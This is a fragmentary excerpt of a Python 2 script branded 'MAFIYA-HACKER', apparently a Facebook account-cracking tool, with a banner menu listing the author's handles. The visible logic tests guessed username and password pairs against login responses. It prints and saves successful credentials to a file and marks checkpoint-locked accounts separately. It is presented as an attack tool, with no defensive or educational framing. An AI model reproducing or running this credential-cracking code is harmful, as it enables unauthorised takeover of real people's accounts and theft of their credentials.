...
#Tools Created By 𝐌𝐀𝐅𝐈𝐘𝐀-𝐇𝐀𝐂𝐊𝐄𝐑
# IT'S PAID TOOLS
...
print("\033[0;91mThis Tool's Free by MAFIYA-HACKER")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : 𝐖𝐎𝐑𝐋𝐃 𝐇𝐀𝐂𝐊𝐄𝐑'
    print '\033[0;94mFACEBOOK : ヰ༺豐 𝐊𝐈𝐍𝐆 ཬྀ豐࿐ヰ'
    print '\033[0;96mGITHUB   : 𝐌𝐀𝐅𝐈𝐘𝐀-𝐇𝐀𝐂𝐊𝐄𝐑'
    print ''
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MAFIYA-HACKER]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [HACKER-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 MafiyaHacker.py')
